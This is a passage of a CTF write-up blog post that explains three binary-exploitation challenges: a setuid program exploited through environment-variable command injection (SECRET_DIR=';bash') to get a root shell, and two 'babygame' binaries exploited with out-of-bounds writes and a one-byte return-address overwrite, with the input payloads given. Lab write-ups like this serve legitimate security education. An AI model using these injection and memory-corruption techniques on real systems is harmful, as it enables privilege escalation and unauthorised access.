+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pbVar1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;((basic_ostream *)std::cout,<span class="hljs-string">&quot;Listing the content of &quot;</span>);<br>pbVar1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;(pbVar1,(<span class="hljs-type">char</span> *)local_70);<br>pbVar1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;(pbVar1,<span class="hljs-string">&quot; as root: &quot;</span>);<br>std::basic_ostream&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>&lt;&lt;<br>          ((basic_ostream&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt; *)pbVar1,<br>           std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>();<br>                <span class="hljs-comment">/* try &#123; // try from 00101435 to 00101439 has its CatchHandler @ 00101512 */</span><br>std::__cxx11::basic_string&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;,std::allocator&lt;<span class="hljs-type">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span><br>          ((<span class="hljs-type">char</span> *)local_48,local_70);<br>                <span class="hljs-comment">/* try &#123; // try from 0010144c to 00101450 has its CatchHandler @ 001014fd */</span><br>std::<span class="hljs-keyword">operator</span>+((<span class="hljs-type">char</span> *)local_68,(basic_string.conflict *)&amp;DAT_0010206d);<br>std::__cxx11::basic_string&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;,std::allocator&lt;<span class="hljs-type">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span><br>          (local_48);<br>std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;local_75);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br>__command = (<span class="hljs-type">char</span> *)std::__cxx11::basic_string&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;,std::allocator&lt;<span class="hljs-type">char</span>&gt;&gt;<br>                    ::<span class="hljs-built_in">c_str</span>();<br>                <span class="hljs-comment">/* try &#123; // try from 0010148c to 001014d1 has its CatchHandler @ 00101530 */</span><br>local_74 = <span class="hljs-built_in">system</span>(__command);<br></code></pre></td></tr></table></figure>
+
+<p>The decompiled C++ program is ugly and I don’t want to format it either. But we can see that the program call the <code>system</code> function during running, so we can set breakpoint at the position before call system to lookup what command is executed in this program using gdb. Then we will find the command is <code>ls $SECRET_DIR</code>. </p>
+<p>Things become easy after figuring out what the program is doing. Using a little knowledge of shell script, we simply wirte command as below:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> SECRET_DIR=<span class="hljs-string">&#x27;;bash&#x27;</span><br>./bin<br></code></pre></td></tr></table></figure>
+
+<p>Then we get <code>root</code> privilege and read flag under <code>/root</code> directory.</p>
+<h3 id="babygame01-02"><a href="#babygame01-02" class="headerlink" title="babygame01&#x2F;02"></a>babygame01&#x2F;02</h3><p>babygame01 requires us to change a local virable on the stack frame. For convenience I use ghidra to decompile the binary file and make virable names easy to understand:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs C">undefined4 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> opt;<br>  undefined4 ret;<br>  <span class="hljs-type">int</span> in_GS_OFFSET;<br>  <span class="hljs-type">int</span> player;<br>  <span class="hljs-type">int</span> times;<br>  <span class="hljs-type">char</span> target_char;<br>  undefined <span class="hljs-built_in">map</span> [<span class="hljs-number">2700</span>];<br>  <span class="hljs-type">int</span> <span class="hljs-built_in">stack</span>;<br>  undefined *local_10;<br>  <br>  local_10 = &amp;stack0x00000004;<br>  <span class="hljs-built_in">stack</span> = *(<span class="hljs-type">int</span> *)(in_GS_OFFSET + <span class="hljs-number">0x14</span>);<br>  init_player(&amp;player);<br>  init_map(<span class="hljs-built_in">map</span>,&amp;player);<br>  print_map(<span class="hljs-built_in">map</span>,&amp;player);<br>  signal(<span class="hljs-number">2</span>,sigint_handler);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>      opt = getchar();<br>      move_player(&amp;player,(<span class="hljs-type">int</span>)(<span class="hljs-type">char</span>)opt,<span class="hljs-built_in">map</span>);<br>      print_map(<span class="hljs-built_in">map</span>,&amp;player);<br>    &#125; <span class="hljs-keyword">while</span> (player != <span class="hljs-number">0x1d</span>);<br>  &#125; <span class="hljs-keyword">while</span> (times != <span class="hljs-number">0x59</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You win!&quot;</span>);<br>  <span class="hljs-keyword">if</span> (target_char != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flage&quot;</span>);<br>    win();<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>  &#125;<br>  ret = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stack</span> != *(<span class="hljs-type">int</span> *)(in_GS_OFFSET + <span class="hljs-number">0x14</span>)) &#123;<br>    ret = __stack_chk_fail_local();<br>  &#125;<br>  <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">move_player</span><span class="hljs-params">(<span class="hljs-type">int</span> *player,<span class="hljs-type">char</span> opt,<span class="hljs-type">int</span> <span class="hljs-built_in">map</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-keyword">if</span> (opt == <span class="hljs-string">&#x27;l&#x27;</span>) &#123;<br>    iVar1 = getchar();<br>    player_tile = (undefined)iVar1;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (opt == <span class="hljs-string">&#x27;p&#x27;</span>) &#123;<br>    solve_round(<span class="hljs-built_in">map</span>,player);<br>  &#125;<br>  *(undefined *)(*player * <span class="hljs-number">0x5a</span> + <span class="hljs-built_in">map</span> + player[<span class="hljs-number">1</span>]) = <span class="hljs-number">0x2e</span>;<br>  <span class="hljs-keyword">if</span> (opt == <span class="hljs-string">&#x27;w&#x27;</span>) &#123;<br>    *player = *player + <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opt == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>    *player = *player + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opt == <span class="hljs-string">&#x27;a&#x27;</span>) &#123;<br>    player[<span class="hljs-number">1</span>] = player[<span class="hljs-number">1</span>] + <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opt == <span class="hljs-string">&#x27;d&#x27;</span>) &#123;<br>    player[<span class="hljs-number">1</span>] = player[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>  &#125;<br>  *(undefined *)(*player * <span class="hljs-number">0x5a</span> + <span class="hljs-built_in">map</span> + player[<span class="hljs-number">1</span>]) = player_tile;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Our player only occupied 1 byte on the map, but can change value on arbitary memory by moving player. Since we need to change 1 byte at position of <code>target_char</code> , the keypoint is to compute the offset of <code>target_char</code> and player position. I use gdb to check how many steps we need to move, and the final payload is:</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aaaawwwwaaaap</span><br></code></pre></td></tr></table></figure>
+
+<p>Decompiled babygame02’s main function is as below:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs C">undefined4 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> player;<br>  <span class="hljs-type">int</span> times;<br>  undefined <span class="hljs-built_in">map</span> [<span class="hljs-number">2700</span>];<br>  <span class="hljs-type">char</span> opt;<br>  undefined *local_10;<br>  <br>  local_10 = &amp;stack0x00000004;<br>  init_player(&amp;player);<br>  init_map(<span class="hljs-built_in">map</span>,&amp;player);<br>  print_map(<span class="hljs-built_in">map</span>,&amp;player);<br>  signal(<span class="hljs-number">2</span>,sigint_handler);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>      iVar1 = getchar();<br>      opt = (<span class="hljs-type">char</span>)iVar1;<br>      move_player(&amp;player,(<span class="hljs-type">int</span>)opt,<span class="hljs-built_in">map</span>);<br>      print_map(<span class="hljs-built_in">map</span>,&amp;player);<br>    &#125; <span class="hljs-keyword">while</span> (player != <span class="hljs-number">0x1d</span>);<br>  &#125; <span class="hljs-keyword">while</span> (times != <span class="hljs-number">0x59</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You win!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Function <code>win</code> still exists but we don’t have regular way to make program execute <code>win</code> function. Thus, also a typical method in stack overflow challenge, we need to modify the <strong>return address</strong> during function call. The frustrating thing is, if we check the program logic of <code>move_player</code> function carefully, we will find that we can only write 1 arbitary byte on the memory, and leave <code>0x2E</code> at old position after moving. So, we can only write <strong>1</strong> byte at the return address, but which byte should we rewrite?</p>
+<p>With ghidra&#x2F;IDA Pro or gdb we will get function <code>win</code>‘s address – <code>0x804975d</code>. And during debug, if we set breakpoint at <code>move_player</code>, we will get function call backtrace as below:</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">► f 0 0x8049479 move_player<span class="hljs-string">+5</span><br>  f 1 0x8049709 main<span class="hljs-string">+149</span><br>  f 2 0xf7c21519 __libc_start_call_main<span class="hljs-string">+121</span><br>  f 3 0xf7c215f3 __libc_start_main<span class="hljs-string">+147</span><br>  f 4 0x804911c _start<span class="hljs-string">+44</span><br></code></pre></td></tr></table></figure>
+
+<p>The return address <code>0x8049479</code> has only 1 byte difference! So our target is to rewrite 1 byte in the return address.</p>
+<p>But there are two tips we need to pay attention with. First, we cannot do a lot of “a” before “d”, because this method will taint local variable such as player, opt and map, which also locates near the return address. So we need to “d” first and use a single “a” to arrive our destination.</p>
+<p>Second, also the most weird, we probably make it on our local machine use <code>0x5d</code>, but will fail on remote. We need to use offset such as <code>0x5e</code>, <code>0x60</code>, <code>0x61</code> and <code>0x64</code>. I still don’t figure it out today, perhaps this issue related to implemention of libc printf function, cause through debug, the control flow changes indeed.</p>
+<p>Final payload:</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ladddddddddddddddddddddddddddddddddddddddddddddddwwwww</span><br></code></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/14/bufbomb/" rel="prev" title="CSAPP: buflab以及从其中得到的启示">
+                  <i class="fa fa-angle-left"></i> CSAPP: buflab以及从其中得到的启示
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/05/24/how-to-debug-heap/" rel="next" title="How to debug heap challenge in CTF?">
+                  How to debug heap challenge in CTF? <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">zeredy879</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
